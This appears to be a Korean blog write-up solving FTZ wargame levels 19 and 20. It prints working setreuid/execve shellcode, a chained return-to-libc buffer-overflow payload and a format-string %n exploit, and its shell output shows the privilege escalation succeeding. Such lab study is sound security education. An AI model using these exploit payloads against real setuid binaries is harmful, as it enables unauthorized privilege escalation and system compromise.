[level19@ftz level19]$ (python -c 'print "A"*44+"\x58\xfc\xff\xbf"'; cat) | ./attackme
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAX?
id
uid=3099(level19) gid=3099(level19) groups=3099(level19)
```

이유는 `setreuid`와 같은 함수가 존재하지 않기 때문이다. 실제 공격하기 위해선 다음과 같은 쉘 코드가 필요하다.

```
"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
```

```
0:  31 c0                   xor    eax,eax
2:  b0 31                   mov    al,0x31
4:  cd 80                   int    0x80
6:  89 c3                   mov    ebx,eax
8:  89 c1                   mov    ecx,eax
a:  31 c0                   xor    eax,eax
c:  b0 46                   mov    al,0x46
e:  cd 80                   int    0x80
10: 31 c0                   xor    eax,eax
12: 50                      push   eax
13: 68 2f 2f 73 68          push   0x68732f2f
18: 68 2f 62 69 6e          push   0x6e69622f
1d: 89 e3                   mov    ebx,esp
1f: 50                      push   eax
20: 53                      push   ebx
21: 89 e1                   mov    ecx,esp
23: 31 d2                   xor    edx,edx
25: b0 0b                   mov    al,0xb
27: cd 80                   int    0x80
```

자 그럼 다시 쉘 코드를 환경변수에 올리고 실행해본다.

```
[level19@ftz level19]$ export EGG=`python -c 'print "\x90"*20+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
[level19@ftz level19]$ tmp/a.out 
addr->0xbffffc48
[level19@ftz level19]$ cd tmp
[level19@ftz tmp]$ ./a.out 
addr->0xbffffc48
[level19@ftz tmp]$ cd ..
[level19@ftz level19]$ (python -c 'print "A"*44+"\x48\xfc\xff\xbf"'; cat) | ./attackme
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH?
id
uid=3100(level20) gid=3099(level19) groups=3099(level19)
my-pass
TERM environment variable not set.

Level20 Password is "we are just regular guys".
```

책에서는 RTL에 대한 학습을 요구했으므로... RTL 기법을 이용한 공격도 시도해본다.

먼저 RET까지의 버퍼 사이즈는 0x2C(44) 바이트 인 것을 알고있다.
필요한건 `setreuid`와 `system` 함수의 주소다. 

```
(gdb) b *main
Breakpoint 1 at 0x804835c
(gdb) r
Starting program: /home/level19/tmp/attackme 

Breakpoint 1, 0x0804835c in main ()
(gdb) print system
$1 = {<text variable, no debug info>} 0x4203f2c0 <system>
(gdb) p setreuid
$2 = {<text variable, no debug info>} 0x420d7920 <setreuid>
(gdb) 
```

먼저 "/bin/sh" 의 위치를 찾아온다.

```
[level19@ftz tmp]$ cat getsh.c
#include <stdio.h>

int main()
{
	long systemaddr = 0x4203f2c0;
	while(memcmp((void*)systemaddr,"/bin/sh",8))
	{
		systemaddr++;
	}
	printf("Addr = %p\n",systemaddr);
	return 0;
}

[level19@ftz tmp]$ ./getsh
Addr = 0x42127ea4
```

자 그럼 `chainning return to libc` 기법을 이용하여 공격을 시도한다.

payload는 다음과 같다.

```
buf[44] | setreuid addr | pop pop ret | ruid(3100) | euid(3100) | system addr | dummy[4] | /bin/sh addr
```

```
[level19@ftz level19]$ objdump -d attackme | egrep 'pop|ret'
 80482d3:	c3                   	ret    
 8048342:	5e                   	pop    %esi
 804836e:	5b                   	pop    %ebx
 8048385:	c3                   	ret    
 80483eb:	5d                   	pop    %ebp
 80483ec:	c3                   	ret    
 80483f8:	5d                   	pop    %ebp
 80483f9:	c3                   	ret    
 8048426:	5d                   	pop    %ebp
 8048427:	c3                   	ret    
 8048438:	5d                   	pop    %ebp
 8048439:	c3                   	ret    
 804846a:	c3                   	ret    
 804849c:	58                   	pop    %eax
 804849d:	5b                   	pop    %ebx
 804849e:	5d                   	pop    %ebp
 804849f:	c3                   	ret    
 80484a8:	5d                   	pop    %ebp
 80484a9:	c3                   	ret    
 80484ba:	5b                   	pop    %ebx
 80484cd:	c3                   	ret    
[level19@ftz level19]$ (python -c 'print "A"*44+"\x20\x79\x0d\x42"+"\x9d\x84\x04\x08"+"\x1c\x0c\x00\x00"*2+"\xc0\xf2\x03\x42"+"\x90"*4+"\xa4\x7e\x12\x42"';cat)|./attackme
B?? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA y

ls 
attackme  hint	public_html  tmp
id
uid=3100(level20) gid=3099(level19) groups=3099(level19)
my-pass

Level20 Password is "we are just regular guys".
```

## [+] FTZ level20

### Analysis

```c++
#include <stdio.h>
main(int argc,char **argv)
{ char bleh[80];
  setreuid(3101,3101);
  fgets(bleh,79,stdin);
  printf(bleh);
}   
```

비교적 코드가 간단하다. 79바이트 만큼 입력을 받고 입력 받은 값을 출력한다.
제한된 입력 값을 받기 때문에 버퍼 오버플로우가 불가능하다. 단 출력하는 `printf` 함수에서 변수를 그대로 사용하고 있다. 

```
[level20@ftz level20]$ ./attackme 
%X
4F
```

다음과 같이 포맷스트링 취약점이 발생하는 것을 확인할 수 있다.

```
AAAA%08X %08X %08X %08X
AAAA0000004F 4212ECC0 4207A750 41414141
```

입력 값까지 0xC 만큼의 크기가 존재한다. 디버거를 이용해 확인하면 더미 크기를 확인할 수 있고, 스택은 다음과 같이 구성된다.

```
0x0000004f | 0x4212ECC0 | 0x4207A750 | bleh[80] | dummy[8] | SFP, RET |
```

그럼 이제 `%n` 포맷스트링을 이용하여 원하는 주소를 쓰면 된다.

```
(python -c 'print "AAAA\x98\x95\x04\x08AAAA\x9a\x95\x04\x08"+"%8x%8x%8x"+"%64616c%n%50031c%n"';cat)|./attackme
```

일단 위의 명령으로 쉘을 획득할 수 있다.
천천히 하나씩 공부해보자. 다음 포스팅에서 이제 본격적으로 시스템 해킹에 대한 공부를 해보겠다.

